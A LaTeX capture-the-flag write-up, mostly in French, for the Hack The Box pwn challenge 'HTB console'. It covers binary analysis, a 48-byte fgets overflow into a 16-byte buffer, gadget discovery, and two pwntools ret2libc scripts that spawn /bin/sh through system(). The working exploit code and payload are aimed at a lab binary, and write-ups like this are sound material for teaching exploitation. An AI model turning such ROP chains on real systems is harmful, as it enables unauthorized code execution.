\chapter{HTB console}
\begin{itemize}
    \item {\bf technics}: ret2libc without ASLR
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Analysis}
\subsection{File info}
\begin{verbatim}
$ file htb-console
htb-console: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
    BuildID[sha1]=575e4055094a7f059c67032dd049e4fdbb171266, for GNU/Linux 3.2.0, 
    stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=./htb-console
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
\end{verbatim}

pas d'execution sur la stack.

\subsection{Execution}


\subsection{static analysis}

\subsubsection{Find main}

\begin{verbatim}
gef>  info file
	Entry point: 0x4010b0
gef>  x/20i 0x4010b0
   0x4010b0:	endbr64 
   0x4010b4:	xor    ebp,ebp
   0x4010b6:	mov    r9,rdx
   0x4010b9:	pop    rsi
   0x4010ba:	mov    rdx,rsp
   0x4010bd:	and    rsp,0xfffffffffffffff0
   0x4010c1:	push   rax
   0x4010c2:	push   rsp
   0x4010c3:	mov    r8,0x401480
   0x4010ca:	mov    rcx,0x401410
   0x4010d1:	mov    rdi,0x401397
   0x4010d8:	call   QWORD PTR [rip+0x2f0a]        # 0x403fe8

gef>  x/20i 0x401397
   0x401397:	push   rbp
   0x401398:	mov    rbp,rsp
   0x40139b:	sub    rsp,0x10
   0x40139f:	mov    eax,0x0
   0x4013a4:	call   0x401196
   0x4013a9:	lea    rdi,[rip+0xd78]        # 0x402128
   0x4013b0:	call   0x401030 <puts@plt>
   0x4013b5:	lea    rdi,[rip+0xd92]        # 0x40214e
   0x4013bc:	mov    eax,0x0
   0x4013c1:	call   0x401050 <printf@plt>
   0x4013c6:	mov    rdx,QWORD PTR [rip+0x2cc3]        # 0x404090 <stdin>
   0x4013cd:	lea    rax,[rbp-0x10]
   0x4013d1:	mov    esi,0x10
   0x4013d6:	mov    rdi,rax
   0x4013d9:	call   0x401080 <fgets@plt>
   0x4013de:	lea    rax,[rbp-0x10]
   0x4013e2:	mov    rdi,rax
   0x4013e5:	call   0x401201
   0x4013ea:	lea    rax,[rbp-0x10]
   0x4013ee:	mov    edx,0x10
\end{verbatim}

on peut le confirmer avec ghidra en allant voir au début du segment
\verb+.text+

\begin{verbatim}
void FUN_004010b0(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 unaff_retaddr;
  undefined auStack_8 [8];

  __libc_start_main(FUN_00401397,unaff_retaddr,&stack0x00000008,FUN_00401410,FUN_00401480,param_3,
                    auStack_8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
\end{verbatim}

\verb+FUN_00401397+ commence bien en \verb+00401397+


\subsubsection{main}
\begin{verbatim}
void main(void)
{
  char local_18 [16];

  FUN_00401196();
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(local_18,0x10,stdin);
    FUN_00401201(local_18);
    memset(local_18,0,0x10);
  } while( true );
}
\end{verbatim}


\subsubsection{process\_input}
\begin{verbatim}
void FUN_00401201(char *param_1)
{
  int iVar1;
  char local_18 [16];

  iVar1 = strcmp(param_1,"id\n");
  if (iVar1 == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    iVar1 = strcmp(param_1,"dir\n");
    if (iVar1 == 0) {
      puts("/home/HTB");
    }
    else {
      iVar1 = strcmp(param_1,"flag\n");
      if (iVar1 == 0) {
        printf("Enter flag: ");
        fgets(local_18,0x30,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        iVar1 = strcmp(param_1,"hof\n");
        if (iVar1 == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&DAT_004040b0,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          iVar1 = strcmp(param_1,"ls\n");
          if (iVar1 == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}
\end{verbatim}

on prend \verb+0x30+ (48) bytes sur un buffer de 16 quand on scan le flag

\begin{verbatim}
0040128c 48 8d 45      LEA       RAX=>local_18,[RBP + -0x10]
         f0
00401290 be 30 00      MOV       ESI,0x30
         00 00
00401295 48 89 c7      MOV       RDI,RAX
00401298 e8 e3 fd      CALL      <EXTERNAL>::fgets  
         ff ff
\end{verbatim}


\section{Exploit}

\subsection{Strategy}
on a un appel à la fonction system. Donc normalement si on trouve l'addresse de
\verb+/bin/sh+ qu'on la met dans \verb+rdi+ et que l'on saute à l'instruction
\verb+0x401381+ qui fait le call à \verb+system+ on devrait gagner.

Grosse erreur car l'instuction \verb+0x401381+ fait un call donc va push
\verb+rip+ sur la stack. il faut trouver l'addresse de \verb+system+



Il va falloir miser sur le fait que l'on ai la même libc qu'en remote et qu'il
n'y ai pas d ASLR car on n'a pas de leak permettant de trouver la libc.


\subsection{dynamic analysis}

\subsubsection{breakpoints}
\begin{itemize}
    \item \verb+b *0x401397+ entry in \verb+main+
    \item \verb+b *0x4013e5+ call \verb+process+
    \item \verb+b *0x401201+ entry in \verb+process+
    \item \verb+b *0x4012f8+ call to \verb+fgets+ to get flag
    \item \verb+b *0x40129d+ return of get flag
\end{itemize}

\subsubsection{Compute payload size}
\begin{verbatim}
gef>  i frame
Stack level 0, frame at 0x7fffffffc060:
 rip = 0x40129d; saved rip = 0x4013ea
 called by frame at 0x7fffffffc080
 Arglist at 0x7fffffffc028, args:
 Locals at 0x7fffffffc028, Previous frame's sp is 0x7fffffffc060
 Saved registers:
  rbp at 0x7fffffffc050, rip at 0x7fffffffc058

gef>  search-pattern AAAA
[+] In '[stack]'(0x7ffffffdc000-0x7ffffffff000), permission=rw-
  0x7fffffffc040 - 0x7fffffffc046  →   "AAAA\n"
\end{verbatim}

\begin{verbatim}
$ echo 'ibase=16;58-40' |bc
24
\end{verbatim}

\subsubsection{find gadget}

on doit passer le pointer vers binsh via rdi. Il faut donc un gadget qui
\verb+pop rdi; ret+

\begin{verbatim}
$ ROPgadget --binary htb-console |grep rdi
...SNIP...
0x0000000000401473 : pop rdi ; ret
...SNIP...
\end{verbatim}

\subsection{Exploit build}


\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./ > pwn-bin.py
\end{verbatim}

\subsubsection{Version 1}
Cette version ne marche pas à cause de la recherche de la string binsh
\begin{verbatim}
log.setLevel('DEBUG')
io = start()
libc = exe.libc
libc.address = 0x00007ffff7dba000
binsh_addr = next(libc.search(b'/bin/sh'))
system_addr = exe.symbols['system']
pop_rdi_addr = 0x0401473
log.debug(f'binsh address: {hex(binsh_addr)}')
log.debug(f'system address: {hex(system_addr)}')
log.debug(f'pop_rdi address: {hex(pop_rdi_addr)}')

offset = 24
payload = flat({
    offset: [
        pop_rdi_addr,
        binsh_addr,
        system_addr
        ]
    })

log.debug(f'payload: {payload}')

log.success(f'received {io.clean()}')
io.sendline("flag")
log.success(f'received {io.clean()}')
io.sendline(payload)
io.interactive()
\end{verbatim}

\subsubsection{Version 2}
la différence est donc basé sur le fait que la chaine \verb+/bin/sh+ se trouve
dans le buffer associé au scan de \verb+hof+
\begin{verbatim}
.. .SNIP. ..
binsh_addr = 0x4040b0
.. .SNIP. ..
log.success(f'received {io.clean()}')
io.sendline("hof")
log.success(f'received {io.clean()}')
io.sendline("/bin/sh")
log.success(f'received {io.clean()}')
io.sendline("flag")
log.success(f'received {io.clean()}')
io.sendline(payload)
io.interactive()
\end{verbatim}

cette version ne marche pas en local par contre sur le remote elle passe.
